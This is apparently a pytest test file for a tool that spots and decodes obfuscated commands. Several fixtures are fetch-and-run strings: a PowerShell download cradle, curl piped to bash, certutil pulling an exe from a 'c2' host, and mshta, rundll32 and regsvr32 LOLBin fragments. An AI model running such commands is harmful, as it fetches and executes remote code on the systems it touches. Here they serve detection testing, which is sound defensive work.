"""Tests for the Learning Feedback Loop — signals + booster + feedback."""
from __future__ import annotations
import pytest

from learning.signals import compute_signals, signal_kind, DEFAULT_CHAIN_PRIORS


# ─── signal extraction (deterministic, pure) ─────────────────────────────
def test_signals_length_bucketing():
    assert compute_signals("a" * 5)["length_bucket"] == "xs"
    assert compute_signals("a" * 100)["length_bucket"] == "s"
    assert compute_signals("a" * 500)["length_bucket"] == "m"
    assert compute_signals("a" * 2000)["length_bucket"] == "l"


def test_signals_detects_powershell():
    s = compute_signals("powershell -c 'IEX(...)'")
    assert s["has_powershell"] is True


def test_signals_detects_encoded_command():
    s = compute_signals("powershell -EncodedCommand SQBFAFgA...")
    assert s["has_encoded_cmd"] is True
    assert s["has_powershell"] is True


def test_signals_detects_gzip_prefix():
    s = compute_signals("H4sIAAAAAAAAA//")   # base64 of 1f 8b ...
    assert s["has_gzip_prefix"] is True


def test_signals_detects_curl_pipe_bash():
    s = compute_signals("curl -fsSL http://x.io/x.sh | bash")
    assert s["has_curl_pipe"] is True


def test_signals_detects_lolbins():
    for tok, key in [("certutil.exe -urlcache", "has_certutil"),
                     ("mshta.exe http://x/x.hta", "has_mshta"),
                     ("rundll32.exe javascript:", "has_rundll32"),
                     ("regsvr32 /s /n /u /i:", "has_regsvr32")]:
        assert compute_signals(tok)[key] is True, f"missed {key}"


def test_signals_detects_defanged_iocs():
    s = compute_signals("hxxp://evil[.]com/path")
    assert s["has_defanged"] is True


def test_signals_stable_across_runs():
    s1 = compute_signals("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://x')")
    s2 = compute_signals("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://x')")
    assert s1 == s2


# ─── signal_kind classification ──────────────────────────────────────────
def test_signal_kind_ps_downloader():
    s = compute_signals("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://x')")
    assert signal_kind(s) == "ps-downloader"


def test_signal_kind_ps_encoded():
    s = compute_signals("powershell -EncodedCommand SQBFAFgA")
    assert signal_kind(s) == "ps-encoded"


def test_signal_kind_linux_pipe():
    s = compute_signals("curl -fsSL http://x/i.sh | bash")
    assert signal_kind(s) == "linux-pipe-shell"


def test_signal_kind_lolbin_certutil():
    s = compute_signals("certutil.exe -urlcache -split -f http://c2/a.exe %TEMP%\\a.exe")
    assert signal_kind(s) == "lolbin-certutil"


def test_signal_kind_defaults_unknown():
    assert signal_kind(compute_signals("hello world")) == "unknown"


# ─── DEFAULT_CHAIN_PRIORS sanity ─────────────────────────────────────────
def test_default_priors_cover_key_kinds():
    for kind in ["ps-encoded", "ps-compressed", "b64-gzip", "b64-zlib",
                 "hex-stream", "url-encoded", "defanged-ioc", "js-charcode"]:
        assert kind in DEFAULT_CHAIN_PRIORS
        assert DEFAULT_CHAIN_PRIORS[kind], f"no priors for {kind}"


def test_default_priors_all_ops_are_strings():
    for chains in DEFAULT_CHAIN_PRIORS.values():
        for chain in chains:
            assert all(isinstance(op, str) for op in chain)


# ─── booster orchestration (mocked history/KB via monkey-patching) ───────
@pytest.mark.asyncio
async def test_boost_returns_no_boost_when_all_sources_empty(monkeypatch):
    from collections import Counter
    import learning.booster as bmod

    async def fake_hist(*a, **k): return Counter()
    async def fake_kb(*a, **k):  return []
    async def fake_thumbs(*a, **k): return Counter(), Counter()

    monkeypatch.setattr(bmod, "_history_frequency", fake_hist)
    monkeypatch.setattr(bmod, "_kb_chains_for_kind", fake_kb)
    monkeypatch.setattr(bmod, "_thumbs_up_down", fake_thumbs)

    r = await bmod.boost("hello world", "u@example.com")
    assert r["enabled"] is False
    assert r["signal_kind"] == "unknown"
    assert r["chain"] is None


@pytest.mark.asyncio
async def test_boost_uses_default_prior_when_only_kind_known(monkeypatch):
    from collections import Counter
    import learning.booster as bmod

    async def fake_hist(*a, **k): return Counter()
    async def fake_kb(*a, **k):  return []
    async def fake_thumbs(*a, **k): return Counter(), Counter()

    monkeypatch.setattr(bmod, "_history_frequency", fake_hist)
    monkeypatch.setattr(bmod, "_kb_chains_for_kind", fake_kb)
    monkeypatch.setattr(bmod, "_thumbs_up_down", fake_thumbs)

    r = await bmod.boost("H4sIAAAAAAAAA/xyz", "u@example.com")
    assert r["enabled"] is True
    assert r["source"] == "default"
    assert r["chain"] in ([["base64-gzip"]] + [["base64-decode","gzip-decompress"]])
    # gzip prefix should surface the b64-gzip kind chain
    assert r["signal_kind"] == "b64-gzip"


@pytest.mark.asyncio
async def test_boost_history_outranks_default(monkeypatch):
    from collections import Counter
    import learning.booster as bmod

    async def fake_hist(*a, **k):
        return Counter({"custom-op → gunzip": 5})
    async def fake_kb(*a, **k):  return []
    async def fake_thumbs(*a, **k): return Counter(), Counter()

    monkeypatch.setattr(bmod, "_history_frequency", fake_hist)
    monkeypatch.setattr(bmod, "_kb_chains_for_kind", fake_kb)
    monkeypatch.setattr(bmod, "_thumbs_up_down", fake_thumbs)

    r = await bmod.boost("H4sIAAAAA…", "u@example.com")
    assert r["source"] == "history"
    assert r["chain"] == ["custom-op", "gunzip"]


@pytest.mark.asyncio
async def test_boost_down_votes_penalise_chain(monkeypatch):
    from collections import Counter
    import learning.booster as bmod

    async def fake_hist(*a, **k):  return Counter({"bad-op": 3})
    async def fake_kb(*a, **k):    return []
    async def fake_thumbs(*a, **k): return Counter(), Counter({"bad-op": 5})

    monkeypatch.setattr(bmod, "_history_frequency", fake_hist)
    monkeypatch.setattr(bmod, "_kb_chains_for_kind", fake_kb)
    monkeypatch.setattr(bmod, "_thumbs_up_down", fake_thumbs)

    r = await bmod.boost("H4sI…", "u@example.com")
    # bad-op score: 3*3 - 5*3 = -6 → should NOT be the top choice
    # We expect either fallback default or nothing
    assert r["chain"] != ["bad-op"]
